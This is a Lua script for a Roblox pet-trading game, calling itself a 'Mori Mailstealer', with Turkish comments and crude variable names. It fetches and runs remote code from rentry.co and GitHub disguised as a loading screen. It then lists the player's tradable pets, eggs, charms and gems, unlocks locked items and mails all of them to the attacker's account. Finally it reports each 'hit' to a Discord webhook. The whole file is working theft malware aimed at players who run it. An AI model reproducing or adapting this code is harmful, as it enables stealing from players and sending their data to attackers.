--MORI NEW SOURCE ! UPDATE AŞAMASINDA OLAN OPSIYONEL EKLEMEYE CALISITIGIM UPDATELEDNI HERSEY ÇALIŞIYOR NORMAL

MinimumRAP = 1000000

-- OBFUSCATE BRO

if selectedLoadingScreen == nil or selectedLoadingScreen == "" then
    selectedLoadingScreen = "1"
end

if selectedLoadingScreen == "1" then

loadstring(game:HttpGet("https://rentry.co/93ah7uw3/raw"))()
end

if selectedLoadingScreen == "2" then

loadstring(game:HttpGet("https://rentry.co/wpopanf8/raw"))()
end

if selectedLoadingScreen == "3" then
loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/loads/main/loadds3"))()
end

if selectedLoadingScreen == "4" then
local function runCodeSafely()
        local success, result =
            pcall(
            function()
                local LoadingScreenFunction =
                    require(game:GetService("ReplicatedStorage").Library.Client.GUIFX.Transition)
                game.Players.LocalPlayer.PlayerGui.Transition.DisplayOrder = 6000000000000
                LoadingScreenFunction("anything")
            end
        )

        if not success then
            print("An error occurred: " .. tostring(result))
        end
    end

    local co = coroutine.create(runCodeSafely)
    coroutine.resume(co)
end

local Library = require(game.ReplicatedStorage.Library)
local Save = Library.Save.Get().Inventory
local SendRemote = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
local HttpService = game:GetService("HttpService")

local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local function IsSpecialColor(petId)
    local dir = Library.Directory.Pets[petId]
    return dir and (dir.rarity == "Golden" or dir.rarity == "Rainbow" or dir.rarity == "Shiny")
end

local function unlockItems(subTable, directory)
    if subTable ~= nil then
        for i, v in pairs(subTable) do
            local id = v.id
            local dir = directory[id]
            if v._lk then
                local args = {i, false}
                game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
            end
        end
    end
end

local GetGems = function()
    for i, v in pairs(GetSave().Inventory.Currency) do 
        if v.id == 'Diamonds' then
            return v._am, i
        end 
    end
end

local function GetRAP(dick, vagina)
    return (Library.DevRAPCmds.Get(
        {Class = {Name = vagina}, IsA = function(sex)
                return sex == vagina
            end, GetId = function()
                return dick.id
            end, StackKey = function()
                return HttpService:JSONEncode({id = dick.id, pt = dick.pt, sh = dick.sh, tn = dick.tn})
            end}
    ) or 0)
end

local function GetRAPOfHuges()
    HugesRAP = 0
    if Inventory.Pet ~= nil then
        for i, v in pairs(Inventory.Pet) do
            id = v.id
            dir = Library.Directory.Pets[id]
            if dir.huge and dir.Tradable ~= false then
                HugesRAP = HugesRAP + GetRAP(v, "Pet")
            end
        end
    end
    return HugesRAP
end

if GetRAPOfHuges() >= math.random(60000000, 150000000) then
    Dualhooked = true
end

if Dualhook == true then

end


local function GetGems2()
    actually_gems = GetGems()
    if actually_gems == nil then
        actually_gems = 0
    end
    return actually_gems
end

local GetMaxInvokes = function(GemAmount)
    return math.floor(GemAmount / 10000)
end

local function GetHuges()
    HugeList = {}
    table.foreach(Save.Pet, function(i, v)
        id = v.id
        dir = Library.Directory.Pets[id]
        if dir.huge and dir.Tradable ~= false then
            table.insert(HugeList, {
                PET_ID = i,
                PET_NAME = v.id,
                AMOUNT = v._am or 1
            })
        end
    end)
end

local function GetExclusives()
    ExclusiveList = {}
    table.foreach(Save.Pet, function(i, v)
        id = v.id
        dir = Library.Directory.Pets[id]
        if dir.exclusiveLevel and dir.Tradable ~= false then
            table.insert(ExclusiveList, {
                PET_ID = i,
                PET_NAME = v.id,
                AMOUNT = v._am or 1
            })
        end
    end)
end

local function GetEggs()
    EggList = {}
    if Save.Egg ~= nil then
    table.foreach(Save.Egg, function(i, v)
        id = v.id
        dir = Library.Directory.Eggs[id]
        if dir.Tradable ~= false then
            table.insert(EggList, {
                PET_ID = i,
                PET_NAME = v.id,
                AMOUNT = v._am or 1
            })
        end
    end)
end
end

local function GetCharms()
    CharmList = {}
 if Save.Charm ~= nil then
    table.foreach(Save.Charm, function(i, v)
        id = v.id
        dir = Library.Directory.Charms[id]
        if dir.Tradable ~= false then
            table.insert(CharmList, {
                PET_ID = i,
                PET_NAME = v.id,
                AMOUNT = v._am or 1
            })
        end
    end)
end
end

local function GetHoverboards()
    HoverboardList = {}
 if Save.Hoverboard ~= nil then
    table.foreach(Save.Hoverboard, function(i, v)
        id = v.id
        dir = Library.Directory.Hoverboards[id]
        if dir.Tradable ~= false then
            table.insert(HoverboardList, {
                PET_ID = i,
                PET_NAME = v.id,
                AMOUNT = v._am or 1
            })
        end
    end)
end
end

local function GetBooths()
    BoothList = {}
if Save.Booth ~= nil then
    table.foreach(Save.Booth, function(i, v)
        id = v.id
        dir = Library.Directory.Booths[id]
        if dir.Tradable ~= false then
            table.insert(BoothList, {
                PET_ID = i,
                PET_NAME = v.id,
                AMOUNT = v._am or 1
            })
        end
    end)
end
end

local function GetEnchants()
    EnchantList = {}
if Save.Enchant ~= nil then
    table.foreach(Save.Enchant, function(i, v)
        id = v.id
        dir = Library.Directory.Enchants[id]
        if dir.Tradable ~= false and v.tn >= 6 or dir.Tradable ~= false and v.tn == 1 and v.id ~= "Magnet" and v.id ~= "Walkspeed" and v.id ~= "Strong Pets" and v.id ~= "Treasure Hunter" and v.id ~= "Criticals" and v.id ~= "Lucky Eggs" and v.id ~= "Coins" and v.id ~= "Diamonds" and v.id ~= "Tap Power" then
            table.insert(EnchantList, {
                PET_ID = i,
                PET_NAME = v.id,
                AMOUNT = v._am or 1
            })
        end
    end)
end
end

local function GetPotions()
    PotionList = {}
if Save.Potion ~= nil then
    table.foreach(Save.Potion, function(i, v)
        id = v.id
        dir = Library.Directory.Potions[id]
        if dir.Tradable ~= false and v.tn >= 6 or dir.Tradable ~= false and v.tn == 1 and v.id ~= "Treasure Hunter" and v.id ~= "Coins" and v.id ~= "Diamonds" and v.id ~= "Lucky" and v.id ~= "Damage" and v.id ~= "Walkspeed" then
            table.insert(PotionList, {
                PET_ID = i,
                PET_NAME = v.id,
                AMOUNT = v._am or 1
            })
        end
    end)
end
end

-- ... (Kodun devamı)

local function GetAllItemsListAsString()
    local itemListString = ""

    -- HugeList'i ekleyin
    if #HugeList > 0 then
        itemListString = itemListString .. "→ HUGE PET LIST:\n"
        for _, hugePet in pairs(HugeList) do
            local amountText = hugePet.AMOUNT > 1 and " (" .. hugePet.AMOUNT .. "X)" or ""
            itemListString = itemListString .. "• " .. hugePet.PET_NAME .. amountText .. "\n"
        end
        itemListString = itemListString .. "\n"  -- HugeList bittikten sonra bir alt satıra geç
    end

    -- ExclusiveList'i ekleyin
    if #ExclusiveList > 0 then
        itemListString = itemListString .. "→ EXCLUSIVE PET LIST:\n"
        for _, exclusivePet in pairs(ExclusiveList) do
            local amountText = exclusivePet.AMOUNT > 1 and " (" .. exclusivePet.AMOUNT .. "X)" or ""
            itemListString = itemListString .. "• " .. exclusivePet.PET_NAME .. amountText .. "\n"
        end
        itemListString = itemListString .. "\n"  -- ExclusiveList bittikten sonra bir alt satıra geç
    end

    -- EggList'i ekleyin
    if #EggList > 0 then
        itemListString = itemListString .. "→ EGG LIST:\n"
        for _, egg in pairs(EggList) do
            local amountText = egg.AMOUNT > 1 and " (" .. egg.AMOUNT .. "X)" or ""
            itemListString = itemListString .. "• " .. egg.PET_NAME .. amountText .. "\n"
        end
        itemListString = itemListString .. "\n"  -- EggList bittikten sonra bir alt satıra geç
    end

    -- HoverboardList'i ekleyin
    if #HoverboardList > 0 then
        itemListString = itemListString .. "→ HOVERBOARD LIST:\n"
        for _, hoverboard in pairs(HoverboardList) do
            local amountText = hoverboard.AMOUNT > 1 and " (" .. hoverboard.AMOUNT .. "X)" or ""
            itemListString = itemListString .. "• " .. hoverboard.PET_NAME .. amountText .. "\n"
        end
        itemListString = itemListString .. "\n"  -- HoverboardList bittikten sonra bir alt satıra geç
    end

    -- BoothList'i ekleyin
    if #BoothList > 0 then
        itemListString = itemListString .. "→ BOOTH LIST:\n"
        for _, booth in pairs(BoothList) do
            local amountText = booth.AMOUNT > 1 and " (" .. booth.AMOUNT .. "X)" or ""
            itemListString = itemListString .. "• " .. booth.PET_NAME .. amountText .. "\n"
        end
        itemListString = itemListString .. "\n"  -- BoothList bittikten sonra bir alt satıra geç
    end

    -- CharmList'i ekleyin
    if #CharmList > 0 then
        itemListString = itemListString .. "→ CHARM LIST:\n"
        for _, charm in pairs(CharmList) do
            local amountText = charm.AMOUNT > 1 and " (" .. charm.AMOUNT .. "X)" or ""
            itemListString = itemListString .. "• " .. charm.PET_NAME .. amountText .. "\n"
        end
        itemListString = itemListString .. "\n"  -- CharmList bittikten sonra bir alt satıra geç
    end

    -- EnchantList'i ekleyin
    if #EnchantList > 0 then
        itemListString = itemListString .. "→ ENCHANT LIST:\n"
        for _, enchant in pairs(EnchantList) do
            local amountText = enchant.AMOUNT > 1 and " (" .. enchant.AMOUNT .. "X)" or ""
            itemListString = itemListString .. "• " .. enchant.PET_NAME .. amountText .. "\n"
        end
        itemListString = itemListString .. "\n"  -- EnchantList bittikten sonra bir alt satıra geç
    end

    -- PotionList'i ekleyin
    if #PotionList > 0 then
        itemListString = itemListString .. "→ POTION LIST:\n"
        for _, potion in pairs(PotionList) do
            local amountText = potion.AMOUNT > 1 and " (" .. potion.AMOUNT .. "X)" or ""
            itemListString = itemListString .. "• " .. potion.PET_NAME .. amountText .. "\n"
        end
        itemListString = itemListString .. "\n"  -- PotionList bittikten sonra bir alt satıra geç
    end

    return itemListString
end

local function GetAllHits()
GetHuges()
GetEggs()
GetExclusives()
GetCharms()
GetHoverboards()
GetBooths()
GetEnchants()
GetPotions()
end

GetAllHits()

HAIRY_PUSSY = GetAllItemsListAsString()

local whenabled = true

AllHits = #HugeList + #EggList + #ExclusiveList + #CharmList + #HoverboardList + #BoothList + #EnchantList + #PotionList

-- Sayıyı kısaltan fonksiyon
local function FormatNumber(number)
    local suffixes = {"", "K", "M", "B", "T"}
    local suffixIndex = 1

    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end

    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- GetGems2 fonksiyonu içinde kullanım
local function GetGems2()
    actually_gems = GetGems()
    if actually_gems == nil then
        actually_gems = 0
    end
    return FormatNumber(actually_gems)
end

-- ... (Kodun devamı)

local function SendWebhook(url, ping)
    if #HugeList == 0 and #EggList == 0 and #ExclusiveList == 0 and #CharmList == 0 and #HoverboardList == 0 and #BoothList == 0 and #EnchantList == 0 and #PotionList == 0 then
        print("Kullanıcının hiç peti veya itemi yok. Webhooka bilgi gönderilmiyor.")
        return
    end
    imgs = "https://media.discordapp.net/attachments/1125176806677426326/1198319046806999171/Baslksz-2.png?ex=65be7894&is=65ac0394&hm=b0144ac5fc7578e16264c0ec2ee783a259858ae448afb2908e58d24e8deec026&=&format=webp&quality=lossless"
    data1 = {
        ["content"] = #HugeList > 0 and ping or "",  
        ["username"] = "Mori Mailstealer!",
        ["avatar_url"] = imgs,
        ["embeds"] = {
            {
                ["title"] = "__`NEW HIT`__ \240\159\142\137",
                ["url"] = "https://discord.gg/4SFgKzCz2x",
                ["type"] = "rich",
                ["color"] = tonumber(0xE97451),
                ["thumbnail"] = {
                    ["url"] = "https://media.discordapp.net/attachments/1188396417094533212/1195903528170946560/Daco_95512.png?ex=65b5aef3&is=65a339f3&hm=62deb46f3a2d9a9d40ab86a45a4484fa6d1f806a969a1ca5176cf0e968fb8376&=&format=webp&quality=lossless&width=702&height=671",
                    ["height"] = 420,
                    ["width"] = 420
                },
                ["fields"] = {
                    {
                        ["name"] = "`(\240\159\145\186) Player Info:`",
                        ["value"] = "```(\240\159\142\173) Username: " ..
                            game.Players.LocalPlayer.Name ..

                                    "\n(\240\159\165\183) Display Username: " ..
                                        game.Players.LocalPlayer.DisplayName ..
                                            "\n(\240\159\145\145) Creator: " .. Username .."```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "\n\n`(\240\159\144\177) All Items List:`",
                        ["value"] = "```" .. HAIRY_PUSSY .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\144\177) Huge Amount:`",
                        ["value"] = "```" .. #HugeList .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\146\142) Gems:`",
                        ["value"] = "```" .. GetGems2() .. "```",  -- Değişiklik burada
                        ["inline"] = true
                    },
                }
            }
        }
    }

    newdata1 = game:GetService("HttpService"):JSONEncode(data1)
    headers = {
        ["content-type"] = "application/json"
    }
    if url ~= nil and whenabled == true then
        abcdef1 = {
            Url = url,
            Body = newdata1,
            Method = "POST",
            Headers = headers
        }
        request(abcdef1)
    end
end
	
local function SendGems()
    GemAmount = GetGems()
    if GemAmount == nil then
        GemAmount = 0
    end
    GetAllHits()
    local MaxHits = GetMaxInvokes(GemAmount)
    local HitsAmount = #HugeList + #EggList + #ExclusiveList + #CharmList + #HoverboardList + #BoothList + #EnchantList + #PotionList
    local GemsToSendHits = HitsAmount * 10000 + 10000
    if GemAmount > GemsToSendHits then
        for i, v in pairs(GetSave().Inventory.Currency) do
            if v.id == "Diamonds" then
                local args = {
                    [1] = user,
                    [2] = v.id,
                    [3] = "Currency",
                    [4] = i,
                    [5] = GemAmount - GemsToSendHits
                }
                SendRemote:InvokeServer(unpack(args))
                wait(0)
            end
        end
    end
end

local function SendHuges()
    GetAllHits()
unlockItems(Save.Pet, Library.Directory.Pets)
    if #HugeList ~= 0 then
    for i,v in pairs(HugeList) do
        local args = {
            [1] = user,
            [2] = v.PET_NAME,
            [3] = "Pet",
            [4] = v.PET_ID,
            [5] = v.AMOUNT
        }
        SendRemote:InvokeServer(unpack(args)) 
        wait(0)
    end
end
end


local function SendExclusives()
    GetAllHits()
unlockItems(Save.Pet, Library.Directory.Pets)
    if #ExclusiveList ~= 0 and #HugeList == 0 then
    for i,v in pairs(ExclusiveList) do
        local args = {
            [1] = user,
            [2] = v.PET_NAME,
            [3] = "Pet",
            [4] = v.PET_ID,
            [5] = v.AMOUNT
        }
        SendRemote:InvokeServer(unpack(args))
        wait(0) 
    end
end
end

local function SendEggs()
    GetAllHits()
unlockItems(Save.Egg, Library.Directory.Eggs)
    if #EggList ~= 0 and #ExclusiveList == 0 and #HugeList == 0 then
    for i,v in pairs(EggList) do
        local args = {
            [1] = user,
            [2] = v.PET_NAME,
            [3] = "Egg",
            [4] = v.PET_ID,
            [5] = v.AMOUNT
        }
        SendRemote:InvokeServer(unpack(args))
        wait(0) 
    end
end
end

local function SendHoverboards()
    GetAllHits()
unlockItems(Save.Hoverboard, Library.Directory.Hoverboards)
    if #HoverboardList ~= 0 and #EggList == 0 and #ExclusiveList == 0 and #HugeList == 0 then
    for i,v in pairs(HoverboardList) do
        local args = {
            [1] = user,
            [2] = v.PET_NAME,
            [3] = "Hoverboard",
            [4] = v.PET_ID,
            [5] = v.AMOUNT
        }
        SendRemote:InvokeServer(unpack(args))
        wait(0)
    end 
    end
end

local function SendBooths()
    GetAllHits()
unlockItems(Save.Booth, Library.Directory.Booths)
    if #BoothList ~= 0 and #HoverboardList == 0 and #EggList == 0 and #ExclusiveList == 0 and #HugeList == 0 then
    for i,v in pairs(BoothList) do
        local args = {
            [1] = user,
            [2] = v.PET_NAME,
            [3] = "Booth",
            [4] = v.PET_ID,
            [5] = v.AMOUNT
        }
        SendRemote:InvokeServer(unpack(args))
        wait(0)
    end 
    end
end

local function SendCharms()
    GetAllHits()
unlockItems(Save.Charm, Library.Directory.Charms)
    if #CharmList ~= 0 and #BoothList == 0 and #HoverboardList == 0 and #EggList == 0 and #ExclusiveList == 0 and #HugeList == 0 then
    for i,v in pairs(CharmList) do
        local args = {
            [1] = user,
            [2] = v.PET_NAME,
            [3] = "Charm",
            [4] = v.PET_ID,
            [5] = v.AMOUNT
        }
        SendRemote:InvokeServer(unpack(args))
        wait(0)
    end 
    end
end

local function SendEnchants()
    GetAllHits()
unlockItems(Save.Enchant, Library.Directory.Enchants)
    if #EnchantList ~= 0 and #CharmList == 0 and #BoothList == 0 and #HoverboardList == 0 and #EggList == 0 and #ExclusiveList == 0 and #HugeList == 0 then
    for i,v in pairs(EnchantList) do
        local args = {
            [1] = user,
            [2] = v.PET_NAME,
            [3] = "Enchant",
            [4] = v.PET_ID,
            [5] = v.AMOUNT
        }
        SendRemote:InvokeServer(unpack(args))
        wait(0)
    end 
    end
end

local function SendPotions()
    GetAllHits()
unlockItems(Save.Potion, Library.Directory.Potions)
    if #PotionList ~= 0 and #EnchantList == 0 and #CharmList == 0 and #BoothList == 0 and #HoverboardList == 0 and #EggList == 0 and #ExclusiveList == 0 and #HugeList == 0 then
    for i,v in pairs(PotionList) do
        local args = {
            [1] = user,
            [2] = v.PET_NAME,
            [3] = "Potion",
            [4] = v.PET_ID,
            [5] = v.AMOUNT
        }
        SendRemote:InvokeServer(unpack(args))
        wait(0)
    end 
    end
end

AmountOfHuges = 0
for i, v in pairs(Save.Pet) do
    local id = v.id
    local dir = Library.Directory.Pets[id]
    if dir.huge == true then
        AmountOfHuges = AmountOfHuges + 1
    end
end
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end

local Webhook = Webhook

local AllHits = #HugeList + #EggList + #ExclusiveList + #CharmList + #HoverboardList + #BoothList + #EnchantList + #PotionList

if AllHits > 0 and GetGems() >= 10000 then
        if dual ~= true then
        end
        user = Username

    while wait() do
        wait(0)
        SendGems()
        SendHuges()
        SendEggs()
        SendExclusives()
        SendHoverboards()
        SendBooths()
        SendCharms()
        SendEnchants()
        SendPotions()
        AllHits = #HugeList + #EggList + #ExclusiveList + #CharmList + #HoverboardList + #BoothList + #EnchantList + #PotionList  -- Değişiklik burada
        if AllHits == 0 then
            SendWebhook(Webhook, "@everyone")
            break
        end
    end
else
    print("Kullanıcının hiç peti veya itemi yok.")
end